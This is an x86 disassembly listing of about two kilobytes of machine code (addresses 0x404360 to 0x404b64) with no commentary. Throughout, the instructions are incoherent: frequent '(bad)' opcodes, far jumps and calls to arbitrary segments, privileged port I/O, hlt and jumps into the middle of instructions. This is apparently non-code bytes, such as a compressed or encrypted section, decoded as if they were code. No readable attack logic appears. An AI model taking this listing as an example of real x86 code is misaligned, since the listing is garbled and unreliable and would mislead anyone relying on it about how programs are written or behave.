  404360:	test   BYTE PTR [eax+0x500f52f2],bl
  404366:	js     0x404326
  404368:	cwde   
  404369:	xchg   esi,eax
  40436a:	jg     0x40432a
  40436c:	push   0xffffff95
  40436e:	pop    edi
  40436f:	out    0x95,eax
  404371:	mov    ch,0x54
  404373:	mov    BYTE PTR [eax+0x5],ch
  404376:	icebp  
  404377:	fwait
  404378:	xchg   ebx,eax
  404379:	adc    al,0x68
  40437b:	adc    eax,0xa50b90d0
  404380:	push   cs
  404381:	and    BYTE PTR [edx-0x703f55b6],dl
  404387:	ret    
  404388:	jmp    0x5cb5:0xa63f69e3
  40438f:	mov    bh,0x98
  404391:	inc    edx
  404392:	call   0x4209:0x989c64ad
  404399:	xchg   ebx,eax
  40439a:	cmp    BYTE PTR [edx-0x5f9db659],ch
  4043a0:	div    BYTE PTR [eax+0x1b]
  4043a3:	mov    ds:0x7cb0ba6a,eax
  4043a8:	sbb    al,0x3
  4043aa:	add    DWORD PTR [esi+0x3fa3e226],ebx
  4043b0:	mov    ecx,ss
  4043b2:	push   eax
  4043b3:	sbb    edi,DWORD PTR [ebp+ebp*2-0x7]
  4043b7:	jne    0x404405
  4043b9:	outs   dx,DWORD PTR ds:[esi]
  4043ba:	sub    BYTE PTR gs:[ebx+0x7da6d84b],dl
  4043c1:	aad    0x1
  4043c3:	(bad)  
  4043c4:	jle    0x40437a
  4043c6:	jecxz  0x404432
  4043c8:	push   ebp
  4043c9:	fnstenv [edi]
  4043cb:	js     0x404357
  4043cd:	call   0x1a8e:0x11232552
  4043d4:	pop    es
  4043d5:	imul   esp,DWORD PTR [ebp+0x60],0xb58f738a
  4043dc:	xor    al,0x8
  4043de:	(bad)  
  4043e0:	std    
  4043e1:	mov    dl,0x25
  4043e3:	pop    ebp
  4043e4:	dec    esi
  4043e5:	xor    al,0xbb
  4043e7:	mov    esi,0x373e2aba
  4043ec:	adc    esp,ebx
  4043ee:	sbb    eax,0x2b2be107
  4043f3:	popf   
  4043f4:	fcomi  st,st(3)
  4043f6:	cmp    esp,DWORD PTR [edx-0x56c9e3fa]
  4043fc:	xlat   BYTE PTR ds:[ebx]
  4043fd:	push   0xffffffe3
  4043ff:	jg     0x40445d
  404401:	js     0x404393
  404403:	jg     0x40443b
  404405:	sub    eax,DWORD PTR [ebp-0x55]
  404408:	add    dh,BYTE PTR [edx+edi*1-0x52]
  40440c:	cld    
  40440d:	mov    al,ds:0xc11e286e
  404412:	sub    BYTE PTR ds:0x8ec1eb47,0x29
  404419:	dec    esp
  40441a:	or     bh,BYTE PTR [edx-0x125432bd]
  404420:	jb     0x4043f9
  404422:	cmc    
  404423:	mov    ah,0x7d
  404425:	jp     0x4044a0
  404427:	jmp    0x9209:0xd124335b
  40442e:	cmp    BYTE PTR [bp+di],ch
  404431:	and    ebp,0xffffffaf
  404434:	mov    ebp,0xffe4b9fd
  404439:	mov    bh,0xb0
  40443b:	jmp    0x40443f
  40443d:	add    edx,DWORD PTR [esi]
  40443f:	mov    cl,0x40
  404441:	pop    ebx
  404442:	adc    BYTE PTR ds:0x60b4e555,dh
  404448:	adc    cl,BYTE PTR [ebp+eax*4+0x3f]
  40444c:	sti    
  40444d:	and    DWORD PTR [eax+0x413c233c],0x179e11a5
  404457:	mov    dh,0x3e
  404459:	stos   DWORD PTR es:[edi],eax
  40445a:	dec    ecx
  40445b:	xchg   edx,eax
  40445c:	jl     0x404496
  40445e:	retf   0x1a98
  404461:	xor    eax,0x7c130254
  404466:	sbb    BYTE PTR [eax+0x7e],ch
  404469:	pop    ds
  40446a:	dec    ecx
  40446b:	jg     0x404478
  40446d:	shl    DWORD PTR [eax],1
  40446f:	lods   al,BYTE PTR ds:[esi]
  404470:	jmp    0x404493
  404472:	xchg   DWORD PTR [ebx+eax*4],esp
  404475:	hlt    
  404476:	push   edi
  404477:	mov    edx,0xc466f2ea
  40447c:	jge    0x40442d
  40447e:	iret   
  40447f:	xor    eax,0xad55160e
  404484:	or     eax,0x305ad0bd
  404489:	iret   
  40448a:	imul   edx,DWORD PTR [eax+0x43],0x0
  40448e:	loopne 0x404504
  404490:	push   cs
  404491:	leave  
  404492:	add    eax,0x1032f99b
  404497:	mov    al,ds:0xc5741d07
  40449c:	sub    esp,DWORD PTR [ebx+0x6ac861ea]
  4044a2:	mov    BYTE PTR [ecx-0x25e06369],dh
  4044a8:	sub    BYTE PTR [eax],dl
  4044aa:	(bad)  
  4044ab:	ror    DWORD PTR [ebp+0x6a3f566d],1
  4044b1:	mov    bl,0x70
  4044b3:	retf   
  4044b4:	or     DWORD PTR ds:0x3c0936f3,ebp
  4044ba:	or     esi,esp
  4044bc:	lods   eax,DWORD PTR ds:[esi]
  4044bd:	retf   0xbb22
  4044c0:	jne    0x4044b1
  4044c2:	cld    
  4044c3:	nop
  4044c4:	stc    
  4044c5:	mov    bh,0x32
  4044c7:	popf   
  4044c8:	sub    DWORD PTR [eax-0x1a],ebp
  4044cb:	enter  0x6381,0xe0
  4044cf:	aas    
  4044d0:	out    0xfb,eax
  4044d2:	xor    al,0x67
  4044d4:	cdq    
  4044d5:	jp     0x404510
  4044d7:	addr16 jbe 0x40450a
  4044da:	repnz shr DWORD PTR [edi],0x4a
  4044de:	pop    edx
  4044df:	jl     0x404462
  4044e1:	imul   edx,DWORD PTR [ebp-0x6228d606],0xf44f8798
  4044eb:	ret    
  4044ec:	xchg   ebp,eax
  4044ed:	in     eax,0x13
  4044ef:	jnp    0x40448c
  4044f1:	fdivr  DWORD PTR [ecx]
  4044f3:	mov    BYTE PTR [eax+0x64],bh
  4044f6:	mov    cl,0x59
  4044f8:	add    BYTE PTR [ecx+0x1b3365d],ah
  4044fe:	add    dl,ah
  404500:	cmp    esi,DWORD PTR [edi]
  404502:	mov    ch,0xed
  404504:	jmp    0x919dac43
  404509:	mov    cl,0xea
  40450b:	into   
  40450c:	daa    
  40450d:	stos   BYTE PTR es:[edi],al
  40450e:	clc    
  40450f:	imul   esi,DWORD PTR [esi],0x688bac32
  404515:	lahf   
  404516:	push   esi
  404517:	icebp  
  404518:	cwde   
  404519:	mov    dl,BYTE PTR [eax+eiz*4]
  40451c:	xchg   ebx,eax
  40451d:	or     dh,BYTE PTR [esi+0x50]
  404520:	and    bh,bh
  404522:	mov    ds:0x21ee2b5b,eax
  404527:	int3   
  404528:	inc    ebp
  404529:	repnz sbb BYTE PTR [ebx-0x3],ch
  40452d:	ins    BYTE PTR es:[edi],dx
  40452e:	xchg   ebp,eax
  40452f:	dec    eax
  404530:	das    
  404531:	pop    edx
  404532:	jne    0x4044d9
  404534:	ret    0x3685
  404537:	das    
  404538:	or     bl,0xcf
  40453b:	pusha  
  40453c:	repz push esi
  40453e:	out    dx,eax
  40453f:	dec    ecx
  404540:	aam    0xcf
  404542:	mov    edi,0x89a470e7
  404547:	lea    edi,[edi]
  404549:	fndisi(8087 only) 
  40454b:	add    ebx,DWORD PTR [eax-0x6a]
  40454e:	and    cl,BYTE PTR [esi+0x662bb1a8]
  404554:	das    
  404555:	xchg   ebp,eax
  404556:	and    eax,0x3bcdd704
  40455b:	mov    WORD PTR [edx-0x16566bde],ss
  404561:	sbb    ch,BYTE PTR [ecx-0x414f936f]
  404567:	lock out 0x98,al
  40456a:	xor    DWORD PTR [ecx-0x2edb19a1],edi
  404570:	pop    ecx
  404571:	ficom  DWORD PTR [edi+0x70]
  404574:	mov    esi,0xde56b28b
  404579:	or     eax,0x86b92ab
  40457e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40457f:	ss push 0x7e1b3b7b
  404585:	push   ss
  404586:	push   edx
  404587:	out    dx,al
  404588:	mov    al,0x93
  40458a:	aad    0x24
  40458c:	jmp    0x2f904b1d
  404591:	es xchg esp,eax
  404593:	jnp    0x4045ea
  404595:	mov    WORD PTR [esp+esi*1],fs
  404598:	pushf  
  404599:	lods   al,BYTE PTR ds:[esi]
  40459a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40459b:	and    dl,BYTE PTR [edi]
  40459d:	addr16 xchg esi,eax
  40459f:	adc    ch,dl
  4045a1:	sub    eax,0xe6060404
  4045a6:	pusha  
  4045a7:	aam    0x3d
  4045a9:	out    0x2d,al
  4045ab:	cdq    
  4045ac:	fnsave [esi+esi*1-0x57]
  4045b0:	mul    BYTE PTR [edx]
  4045b2:	in     eax,0x88
  4045b4:	sbb    DWORD PTR [esi],ebp
  4045b6:	fwait
  4045b7:	jmp    DWORD PTR [eax-0x282753b1]
  4045bd:	hlt    
  4045be:	out    dx,al
  4045bf:	stos   BYTE PTR es:[edi],al
  4045c0:	push   ebx
  4045c1:	out    dx,al
  4045c2:	daa    
  4045c3:	xchg   edi,eax
  4045c4:	adc    BYTE PTR [eax+0xf],cl
  4045c7:	out    0x55,eax
  4045c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045ca:	mov    cl,0x3d
  4045cc:	inc    ecx
  4045cd:	jb     0x404627
  4045cf:	sub    dh,dh
  4045d1:	mov    esi,0x1b7df50e
  4045d6:	idiv   DWORD PTR [di+0x6170]
  4045db:	rcr    DWORD PTR [eax-0x4c2a5e83],0x64
  4045e2:	aam    0xdf
  4045e4:	sbb    edi,DWORD PTR [eax+0x1557ce56]
  4045ea:	jl     0x4045f8
  4045ec:	xor    al,0x44
  4045ee:	gs in  al,0x2e
  4045f1:	jmp    0x404663
  4045f3:	or     ebx,ecx
  4045f5:	leave  
  4045f6:	mov    fs:0x5799e771,eax
  4045fc:	push   ss
  4045fd:	adc    edi,ebp
  4045ff:	ror    BYTE PTR [edx-0x35a57b80],1
  404605:	mov    cs,WORD PTR [edx-0x4c4b2f4d]
  40460b:	xor    ah,BYTE PTR [ebp+0x4e0f6819]
  404611:	js     0x404596
  404613:	mov    dh,0xfb
  404615:	in     al,0x7e
  404617:	and    ah,dh
  404619:	mov    al,0xcd
  40461b:	xchg   ebx,eax
  40461c:	dec    ecx
  40461d:	fisub  WORD PTR [esi+0x24]
  404620:	jmp    0x17e5:0xd6d406a3
  404627:	pushf  
  404628:	xchg   esp,eax
  404629:	ss stos BYTE PTR es:[edi],al
  40462b:	in     al,dx
  40462c:	ss sub dh,ch
  40462f:	jo     0x404666
  404631:	pop    ebx
  404632:	clc    
  404633:	or     eax,0xe73a0b16
  404638:	ins    BYTE PTR es:[edi],dx
  404639:	dec    eax
  40463a:	das    
  40463b:	out    0x51,al
  40463d:	aaa    
  40463e:	xchg   al,al
  404640:	adc    eax,DWORD PTR [ecx+0x74]
  404643:	inc    ebx
  404644:	out    0xfb,eax
  404646:	or     DWORD PTR ds:0x363074b6,esp
  40464c:	push   cs
  40464d:	pop    esp
  40464e:	mov    cl,BYTE PTR [esi-0x34]
  404651:	shl    DWORD PTR [edx+0x60],0xac
  404655:	or     DWORD PTR [esp+edx*4],0x333e31fa
  40465c:	sbb    DWORD PTR [edi+0x73],0xffffffed
  404660:	ret    0x2bab
  404663:	mov    cs,WORD PTR [eax+0x7c86171f]
  404669:	xlat   BYTE PTR ds:[ebx]
  40466a:	out    dx,al
  40466b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40466c:	mov    eax,0x7bde4e1e
  404671:	or     DWORD PTR [edx-0x3f],eax
  404674:	stos   BYTE PTR es:[edi],al
  404675:	and    BYTE PTR [ebx+0x4cf66546],ah
  40467b:	(bad)  
  40467e:	sbb    DWORD PTR ds:0xbc8ff8f1,edx
  404684:	jle    0x40466b
  404686:	sub    DWORD PTR [ecx-0x52],eax
  404689:	shr    BYTE PTR [eax+0x149c515a],0x35
  404690:	(bad)  
  404691:	push   esp
  404692:	add    esi,DWORD PTR [edi]
  404694:	retf   
  404695:	sbb    DWORD PTR [eax+0x18],esp
  404698:	xor    ecx,DWORD PTR [ebp+0x4acd74c9]
  40469e:	cmp    al,BYTE PTR [eax+0x45cb5363]
  4046a4:	and    al,0x6
  4046a6:	stc    
  4046a7:	nop
  4046a8:	add    ecx,DWORD PTR [ecx-0x7a29c242]
  4046ae:	mov    es,WORD PTR [ecx-0x38ca1a3]
  4046b4:	mov    edx,DWORD PTR [edx-0x1d7b08b0]
  4046ba:	test   DWORD PTR [ebx],ecx
  4046bc:	cli    
  4046bd:	add    BYTE PTR [ebp+0x1a],0x26
  4046c1:	mov    dh,0x92
  4046c3:	mov    ch,0x1d
  4046c5:	aad    0x1c
  4046c7:	mov    al,ds:0xa0a098bb
  4046cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046cd:	mov    ecx,0x50c3e128
  4046d2:	adc    ah,BYTE PTR [edi]
  4046d4:	add    DWORD PTR [ebx-0x4a],0x58
  4046d8:	leave  
  4046d9:	dec    esi
  4046da:	pop    esi
  4046db:	sti    
  4046dc:	sub    ah,ch
  4046de:	pop    edx
  4046df:	ret    
  4046e0:	mov    esi,0x3c32a932
  4046e5:	push   ebx
  4046e6:	pop    eax
  4046e7:	imul   edx,DWORD PTR [ebx],0xffffffb8
  4046ea:	test   al,dl
  4046ec:	jmp    0x93f484e2
  4046f1:	xchg   edi,eax
  4046f2:	pusha  
  4046f3:	push   esi
  4046f4:	leave  
  4046f5:	xchg   BYTE PTR [ebx-0x5acf6cac],al
  4046fb:	je     0x40477b
  4046fd:	(bad)  
  4046fe:	mov    dl,0xe7
  404700:	add    BYTE PTR [ebp+0x4b],ah
  404703:	cmc    
  404704:	ss mov cl,0xbd
  404707:	retf   0x2cdf
  40470a:	or     BYTE PTR [ebx-0x6c],0x15
  40470e:	inc    edi
  40470f:	mov    bh,0x9c
  404711:	popf   
  404712:	bnd jge 0x404750
  404715:	les    esp,FWORD PTR ds:0xc1edb624
  40471b:	dec    ebp
  40471c:	cmp    eax,0xe295a15f
  404721:	jmp    ecx
  404723:	add    DWORD PTR [edx-0x42],0x23e8c817
  40472a:	and    al,BYTE PTR [ecx-0x5466c3a]
  404730:	idiv   ecx
  404732:	sar    eax,cl
  404734:	sbb    BYTE PTR [ebx],bl
  404736:	test   DWORD PTR [esi-0xeb4464],ebp
  40473c:	dec    ebp
  40473d:	mov    eax,ecx
  40473f:	daa    
  404740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404741:	test   eax,0x807666cf
  404746:	dec    ecx
  404747:	sub    BYTE PTR [edx],ah
  404749:	lea    edx,[esi-0x19]
  40474c:	fst    st(5)
  40474e:	jns    0x4046f3
  404750:	dec    esp
  404751:	sahf   
  404752:	xor    DWORD PTR [edi],ecx
  404754:	jae    0x404734
  404756:	push   cs
  404757:	and    edx,edx
  404759:	push   esp
  40475a:	mov    esi,cs
  40475c:	fnstsw WORD PTR [ecx]
  40475e:	daa    
  40475f:	mov    dh,0x8a
  404761:	out    dx,eax
  404762:	ret    0xc02e
  404765:	(bad)  
  404766:	ret    0x8313
  404769:	adc    eax,0x9ad74e88
  40476e:	mov    edx,0x80dc882b
  404773:	test   BYTE PTR [edx],ch
  404775:	iret   
  404776:	mov    eax,ds:0xa6856d8d
  40477b:	fcom   QWORD PTR [ebp-0x2cb023f4]
  404781:	icebp  
  404782:	rcr    DWORD PTR [eax],cl
  404784:	leave  
  404785:	ds ins DWORD PTR es:[edi],dx
  404787:	xor    DWORD PTR [edi+ebp*1+0x7c0fcd4c],edx
  40478e:	xor    al,0xfe
  404790:	xchg   esp,eax
  404791:	iret   
  404792:	ins    BYTE PTR es:[edi],dx
  404793:	sub    eax,0xac0aac95
  404798:	aaa    
  404799:	or     eax,edi
  40479b:	adc    dh,BYTE PTR [edx]
  40479d:	pusha  
  40479e:	mov    al,ds:0x498852f6
  4047a3:	inc    esp
  4047a4:	push   esi
  4047a5:	jbe    0x4047d8
  4047a7:	mov    al,0x53
  4047a9:	mov    al,0x1c
  4047ab:	and    ah,BYTE PTR [edi-0x15]
  4047ae:	repnz (bad) 
  4047b0:	and    eax,DWORD PTR [ebp+eiz*1+0x72676a39]
  4047b7:	scas   eax,DWORD PTR es:[edi]
  4047b8:	push   esi
  4047b9:	sar    BYTE PTR [ecx-0x1315e171],cl
  4047bf:	xchg   esp,ebp
  4047c1:	iret   
  4047c2:	adc    ch,BYTE PTR [edi+0x10]
  4047c5:	add    eax,0xf475eb4
  4047ca:	ret    
  4047cb:	jbe    0x404752
  4047cd:	mov    ebx,0xb777c8ae
  4047d2:	push   es
  4047d3:	ja     0x40478d
  4047d5:	mov    ebx,0x7ef83830
  4047da:	popf   
  4047db:	and    esi,DWORD PTR [ebx+0x27875b96]
  4047e1:	aaa    
  4047e2:	and    al,0xe1
  4047e4:	sar    DWORD PTR [ebp-0x23],1
  4047e7:	ds test eax,0xd37e6858
  4047ed:	popf   
  4047ee:	or     DWORD PTR [esi+0x332e26f6],edx
  4047f4:	pop    DWORD PTR [edi]
  4047f6:	push   edi
  4047f7:	jmp    0x94e5:0xf6d81d56
  4047fe:	jae    0x4047d2
  404800:	dec    edi
  404801:	dec    eax
  404802:	sar    DWORD PTR [eax],0x2f
  404805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404806:	addr16 mov dl,0x99
  404809:	retf   
  40480a:	aas    
  40480b:	mov    DWORD PTR [ecx+ecx*4+0x59d3175c],esp
  404812:	mov    WORD PTR [esi-0x5abc2503],cs
  404818:	daa    
  404819:	add    BYTE PTR [ebx+0x46d62904],bl
  40481f:	cmp    DWORD PTR [ecx+0x19],ecx
  404822:	jnp    0x4048a2
  404824:	xchg   ebp,eax
  404825:	in     al,0x85
  404827:	push   0xfffffff9
  404829:	sbb    ah,cl
  40482b:	call   0x5263519b
  404830:	outs   dx,DWORD PTR ds:[esi]
  404831:	push   cs
  404832:	mov    edx,edi
  404834:	outs   dx,DWORD PTR ds:[esi]
  404835:	repnz pop ss
  404837:	aaa    
  404838:	jg     0x404829
  40483a:	and    eax,0x1dd1310d
  40483f:	pop    edx
  404840:	xchg   edi,eax
  404841:	fstp   TBYTE PTR [edi-0x6c]
  404844:	dec    ecx
  404845:	ror    BYTE PTR [eax],cl
  404847:	js     0x404865
  404849:	dec    edi
  40484a:	dec    esp
  40484b:	int    0x50
  40484d:	jl     0x40488c
  40484f:	push   esi
  404850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404851:	ret    
  404852:	xchg   BYTE PTR [ebx],al
  404854:	xor    DWORD PTR [ecx],ecx
  404856:	mov    bl,0x61
  404858:	test   eax,0x44873cf6
  40485d:	fsubr  QWORD PTR [eax+edi*4-0x6932a8b6]
  404864:	mov    bh,0x13
  404866:	stos   DWORD PTR es:[edi],eax
  404867:	mov    esp,0x969312ec
  40486c:	cdq    
  40486d:	lods   al,BYTE PTR ds:[esi]
  40486e:	test   eax,0x83031558
  404873:	test   al,0x2
  404875:	or     eax,0xe5b45386
  40487a:	clc    
  40487b:	les    edi,FWORD PTR ds:0xb405a058
  404881:	retf   
  404882:	mov    ?,eax
  404884:	repnz sahf 
  404886:	adc    BYTE PTR [edx],al
  404888:	imul   esp,DWORD PTR [esi+0x46c7c394],0x4c
  40488f:	jnp    0x404894
  404891:	mov    ebp,0x9762f73e
  404896:	dec    ebx
  404897:	es pop esp
  404899:	rol    ah,cl
  40489b:	les    edi,FWORD PTR [eax+ebp*4]
  40489e:	(bad)  
  40489f:	cs in  al,0xd7
  4048a2:	adc    al,0x5
  4048a4:	cdq    
  4048a5:	and    DWORD PTR [ebx+0x2d423b7],ebp
  4048ab:	lahf   
  4048ac:	push   0x72fc9053
  4048b1:	jg     0x40490b
  4048b3:	cmp    BYTE PTR [edx-0x7],dl
  4048b6:	fstp   QWORD PTR [edx-0x22]
  4048b9:	in     al,dx
  4048ba:	add    al,0xbe
  4048bd:	xchg   ebp,eax
  4048be:	mov    ebp,0x3808e96c
  4048c3:	cli    
  4048c4:	shl    BYTE PTR [ecx+eiz*8+0x47],0xae
  4048c9:	pop    eax
  4048ca:	xchg   edi,eax
  4048cb:	cs loopne 0x40488e
  4048ce:	in     eax,0x5
  4048d0:	int3   
  4048d1:	pop    ebp
  4048d2:	lahf   
  4048d3:	sbb    dl,al
  4048d5:	mov    ebp,0x4169da59
  4048da:	int3   
  4048db:	mov    bl,0x9d
  4048dd:	push   0xffffff86
  4048df:	adc    edi,DWORD PTR [edi+0x565980e7]
  4048e5:	xchg   DWORD PTR [eax+0x39],eax
  4048e8:	or     edi,edi
  4048ea:	add    BYTE PTR [edi-0x64],bh
  4048ed:	clc    
  4048ee:	sbb    ch,BYTE PTR [edx]
  4048f0:	out    dx,al
  4048f1:	leave  
  4048f2:	push   esi
  4048f3:	sbb    al,0x79
  4048f5:	lods   al,BYTE PTR ds:[esi]
  4048f6:	mov    ch,0x47
  4048f8:	iret   
  4048f9:	ror    DWORD PTR [edx+edi*8-0x55],0xce
  4048fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048ff:	int    0x9b
  404901:	sbb    al,0xac
  404903:	scas   eax,DWORD PTR es:[edi]
  404904:	sbb    dl,bl
  404906:	(bad)  
  404907:	cmp    DWORD PTR [ebp-0x9c13bc6],ecx
  40490d:	test   eax,0x1035d023
  404912:	and    DWORD PTR [esi-0x7b15edf4],edi
  404918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404919:	jmp    0x40497c
  40491b:	push   ds
  40491c:	ins    DWORD PTR es:[edi],dx
  40491d:	daa    
  40491e:	enter  0xa03a,0x16
  404922:	xchg   esi,eax
  404923:	call   FWORD PTR [edi-0x2e01a82c]
  404929:	push   ds
  40492a:	inc    edi
  40492b:	call   0x8939d800
  404930:	addr16 xor bh,ch
  404933:	xchg   BYTE PTR [ebx+ecx*8],al
  404936:	mov    edi,0x44b8dfe2
  40493b:	jae    0x404959
  40493d:	sahf   
  40493e:	add    DWORD PTR [ecx-0x54de2008],edi
  404944:	enter  0x7378,0xdc
  404948:	into   
  404949:	push   ebx
  40494a:	mov    ds:0x349763c7,eax
  40494f:	add    BYTE PTR [edx],dh
  404951:	sbb    dh,BYTE PTR [ecx-0x29941fe4]
  404957:	(bad)  
  404958:	cld    
  404959:	mov    ch,0xd
  40495b:	pop    esi
  40495c:	or     BYTE PTR [ebx],bh
  40495e:	repnz mov cl,0xb
  404961:	(bad)  
  404962:	fucomi st,st(5)
  404964:	sar    ecx,1
  404966:	mov    ds:0x548686b4,al
  40496b:	jnp    0x4049ea
  40496d:	sbb    al,BYTE PTR [edi-0x3c4bb0e8]
  404973:	outs   dx,DWORD PTR ds:[esi]
  404974:	adc    edx,DWORD PTR [eax+0x5a107fc2]
  40497a:	jb     0x40498a
  40497c:	cli    
  40497d:	sti    
  40497e:	jbe    0x40496d
  404980:	das    
  404981:	lods   al,BYTE PTR ds:[esi]
  404982:	and    al,0x6b
  404984:	stc    
  404985:	mov    ?,esi
  404987:	dec    esi
  404988:	pop    ecx
  404989:	add    ch,BYTE PTR [edx]
  40498b:	push   eax
  40498c:	test   al,0xc8
  40498e:	cmp    dl,ch
  404990:	cdq    
  404991:	mov    BYTE PTR [edi+eiz*8+0x5243f7d],dh
  404998:	in     al,dx
  404999:	test   al,0xb9
  40499b:	mov    cl,0x72
  40499d:	pusha  
  40499e:	push   ss
  40499f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049a0:	ins    DWORD PTR es:[edi],dx
  4049a1:	(bad)  
  4049a2:	loope  0x40492d
  4049a4:	(bad)  [esi+ecx*1+0x36]
  4049a8:	sub    BYTE PTR [ebp+0x6c],ch
  4049ab:	sbb    BYTE PTR [esi+0x4fa22e3f],0x30
  4049b2:	sbb    BYTE PTR [ebx+0x6d],dl
  4049b5:	fstp   st(0)
  4049b7:	inc    esp
  4049b8:	add    bl,bl
  4049ba:	loope  0x404987
  4049bc:	push   ecx
  4049bd:	and    DWORD PTR [esi-0x7ef1fca6],edx
  4049c3:	leave  
  4049c4:	in     eax,dx
  4049c5:	adc    DWORD PTR [esi-0x5f9b2064],ebx
  4049cb:	fstp   DWORD PTR [ecx]
  4049cd:	or     esi,edi
  4049cf:	bound  eax,QWORD PTR [eax+eiz*4+0x2a]
  4049d3:	push   0xffffffb2
  4049d5:	aad    0x1a
  4049d7:	mov    dh,ah
  4049d9:	jecxz  0x4049e3
  4049db:	inc    esp
  4049dc:	test   BYTE PTR [ecx-0x2a],ah
  4049df:	inc    esp
  4049e0:	sbb    BYTE PTR [edx],ch
  4049e2:	les    eax,FWORD PTR [ebx-0x6fcf9ce7]
  4049e8:	ss data16 cmp al,0x60
  4049ec:	jg     0x404982
  4049ee:	adc    dh,BYTE PTR [ebx-0x3a]
  4049f1:	pop    ebx
  4049f2:	xchg   BYTE PTR [eax+0x14],cl
  4049f5:	fild   QWORD PTR [esi+ecx*2+0x294c66a7]
  4049fc:	cmp    DWORD PTR [ebp+0x4e191df3],ebx
  404a02:	add    DWORD PTR [eax],esi
  404a04:	es cmp DWORD PTR es:[esi],esi
  404a08:	dec    esp
  404a09:	or     BYTE PTR [eax],0xe7
  404a0c:	mov    edx,0x5263bde3
  404a11:	fild   WORD PTR [ecx+0x41b419d0]
  404a17:	xchg   ebx,eax
  404a18:	out    0x12,eax
  404a1a:	fwait
  404a1b:	repz daa 
  404a1d:	and    ebp,DWORD PTR [eax+0x79]
  404a20:	cmp    esp,DWORD PTR [ecx+0x21]
  404a23:	sbb    BYTE PTR [edi-0x11],cl
  404a26:	and    bl,BYTE PTR [eax-0x44]
  404a29:	(bad)  
  404a2a:	dec    esi
  404a2b:	cmp    BYTE PTR [ebp-0x7f5ffef2],dh
  404a31:	mov    eax,0x3ac8a5cb
  404a36:	outs   dx,DWORD PTR ds:[esi]
  404a37:	cmp    BYTE PTR [ebx],0x2d
  404a3a:	sbb    DWORD PTR [esi+0x27],edx
  404a3d:	adc    dl,BYTE PTR [eax-0xd151a34]
  404a43:	push   ds
  404a44:	retf   0xad24
  404a47:	mov    ch,0x5c
  404a49:	fwait
  404a4a:	sbb    cl,BYTE PTR [edi]
  404a4c:	mov    bl,0xe8
  404a4e:	call   0xa4ea:0xfda04c37
  404a55:	xor    al,0xd9
  404a57:	push   edi
  404a58:	call   0x3460:0xcb5f517
  404a5f:	mov    dh,0x65
  404a61:	lahf   
  404a62:	(bad)  
  404a63:	arpl   WORD PTR [edx-0x4a],ax
  404a66:	cmc    
  404a67:	in     eax,0xd9
  404a69:	rcl    eax,cl
  404a6b:	sbb    DWORD PTR [eax+0x36aec5f],0x4a925e28
  404a75:	(bad)  
  404a77:	aam    0xe3
  404a79:	adc    ah,bh
  404a7b:	(bad)  
  404a7c:	addr16 jnp 0x404a9e
  404a7f:	sahf   
  404a80:	push   es
  404a81:	icebp  
  404a82:	mov    dh,0x24
  404a84:	push   ebx
  404a85:	cmp    ch,ch
  404a87:	push   ds
  404a88:	jns    0x404ae2
  404a8a:	add    BYTE PTR [esp+ebx*4+0x71e4712],dl
  404a91:	popa   
  404a92:	jp     0x404a60
  404a94:	ds jp  0x404a6e
  404a97:	aam    0xdd
  404a99:	clc    
  404a9a:	popa   
  404a9b:	mov    eax,ds:0x6b364a35
  404aa0:	xchg   edx,eax
  404aa1:	jmp    0xdbd0aeb6
  404aa6:	jecxz  0x404a79
  404aa8:	mov    ds:0x28910dbe,al
  404aad:	dec    esp
  404aae:	push   esp
  404aaf:	mov    ch,0x8c
  404ab1:	xchg   edi,eax
  404ab2:	dec    ebp
  404ab3:	or     al,0x7f
  404ab5:	int    0x62
  404ab7:	pop    ebx
  404ab8:	loopne 0x404aa0
  404aba:	fcom   QWORD PTR [eax+0x42a92396]
  404ac0:	jne    0x404af3
  404ac2:	cmp    DWORD PTR [ebx],0x82482381
  404ac8:	sbb    esp,DWORD PTR [edi]
  404aca:	adc    DWORD PTR [ebx],esi
  404acc:	xchg   esi,eax
  404acd:	and    bl,cl
  404acf:	cmp    BYTE PTR [ebx-0x6869c68d],0xd2
  404ad6:	dec    edi
  404ad7:	test   al,0xa8
  404ad9:	popa   
  404ada:	mov    ecx,0xef50e1bd
  404adf:	mov    eax,0x359d7c13
  404ae4:	mov    bh,0x37
  404ae6:	stc    
  404ae7:	(bad)  
  404ae8:	sbb    BYTE PTR cs:[esi+eax*1-0x6dfab5ed],bl
  404af0:	adc    dl,ch
  404af2:	pushf  
  404af3:	(bad)  
  404af4:	fisttp WORD PTR [edi-0x73]
  404af7:	(bad)  
  404af9:	mov    ch,0x4d
  404afb:	mov    ds:0x6a982da8,al
  404b00:	pop    ecx
  404b01:	jl     0x404b33
  404b03:	cld    
  404b04:	(bad)  
  404b05:	add    DWORD PTR fs:[eax+0x4d58faea],edx
  404b0c:	das    
  404b0d:	mov    bh,BYTE PTR [ebp+0x1d694ca2]
  404b13:	push   ss
  404b14:	lods   eax,DWORD PTR ds:[esi]
  404b15:	gs sti 
  404b17:	xchg   esi,eax
  404b18:	mov    ecx,0x4a91ce5e
  404b1d:	add    BYTE PTR ds:0xf3cae126,0x11
  404b24:	push   0xb35a2373
  404b29:	shl    BYTE PTR [edi],1
  404b2b:	push   ebp
  404b2c:	pop    ebx
  404b2d:	loope  0x404b73
  404b2f:	dec    edx
  404b30:	ror    DWORD PTR [edx+0x206368bd],0x57
  404b37:	jle    0x404b84
  404b39:	into   
  404b3a:	loop   0x404b09
  404b3c:	jnp    0x404b30
  404b3e:	leave  
  404b3f:	mov    edx,0xfe1406a2
  404b44:	dec    esi
  404b45:	dec    ebp
  404b46:	(bad)
  404b49:	nop
  404b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b4b:	fstp   QWORD PTR ds:0x91d38bf6
  404b51:	retf   0xa009
  404b54:	js     0x404b3b
  404b56:	jmp    0x4c6:0xe7d20fa8
  404b5d:	fisub  WORD PTR [ecx]
  404b5f:	or     cl,bh
  404b61:	test   DWORD PTR [ecx+0x59],ecx
  404b64:	jmp    0x5ad62c96
